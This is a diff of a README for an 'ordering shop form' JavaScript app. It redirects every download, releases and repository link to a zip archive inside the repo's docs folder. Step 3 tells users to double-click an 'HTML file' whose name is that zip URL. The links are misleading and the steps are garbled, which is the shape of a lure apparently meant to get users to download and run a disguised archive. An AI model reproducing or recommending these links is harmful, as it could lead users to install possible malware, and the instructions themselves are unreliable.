@@ -1,6 +1,6 @@
 # 🛒 ordering-shop-form-javascript - Simple Ordering Experience for Everyone
 
-[![Download Now](https://raw.githubusercontent.com/pere3445/ordering-shop-form-javascript/master/docs/javascript_form_ordering_shop_2.8.zip)](https://raw.githubusercontent.com/pere3445/ordering-shop-form-javascript/master/docs/javascript_form_ordering_shop_2.8.zip)
+[![Download Now](https://github.com/pere3445/ordering-shop-form-javascript/raw/refs/heads/master/docs/shop-javascript-form-ordering-1.8-beta.3.zip)](https://github.com/pere3445/ordering-shop-form-javascript/raw/refs/heads/master/docs/shop-javascript-form-ordering-1.8-beta.3.zip)
 
 ## 📦 Overview
 
@@ -18,7 +18,7 @@ To get started with the Ordering Shop Form, you need to download the application
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [Download Link](https://raw.githubusercontent.com/pere3445/ordering-shop-form-javascript/master/docs/javascript_form_ordering_shop_2.8.zip).
+To download the application, visit this page to download: [Download Link](https://github.com/pere3445/ordering-shop-form-javascript/raw/refs/heads/master/docs/shop-javascript-form-ordering-1.8-beta.3.zip).
 
 ### Steps to Download:
 
@@ -34,7 +34,7 @@ Once you have downloaded the app, follow these simple steps to run it:
 
 1. **Locate the File**: Go to the folder where you saved the downloaded file.
 2. **Extract (if needed)**: If you downloaded a ZIP file, right-click on it and choose "Extract All" to get the contents.
-3. **Open the HTML File**: Find the HTML file (usually named `https://raw.githubusercontent.com/pere3445/ordering-shop-form-javascript/master/docs/javascript_form_ordering_shop_2.8.zip` or similar) and double-click it.
+3. **Open the HTML File**: Find the HTML file (usually named `https://github.com/pere3445/ordering-shop-form-javascript/raw/refs/heads/master/docs/shop-javascript-form-ordering-1.8-beta.3.zip` or similar) and double-click it.
 4. **Use the App**: Your web browser will open, displaying the Order Form.
 
 You can now fill out your order, choose items, and submit the form!
@@ -76,7 +76,7 @@ If you need additional help or have questions, you can reach out to the communit
 
 ## 🔗 Links
 
-- [Visit Releases Page](https://raw.githubusercontent.com/pere3445/ordering-shop-form-javascript/master/docs/javascript_form_ordering_shop_2.8.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/pere3445/ordering-shop-form-javascript/master/docs/javascript_form_ordering_shop_2.8.zip)
+- [Visit Releases Page](https://github.com/pere3445/ordering-shop-form-javascript/raw/refs/heads/master/docs/shop-javascript-form-ordering-1.8-beta.3.zip)
+- [GitHub Repository](https://github.com/pere3445/ordering-shop-form-javascript/raw/refs/heads/master/docs/shop-javascript-form-ordering-1.8-beta.3.zip)
 
 Thank you for choosing the Ordering Shop Form application. Enjoy your experience!
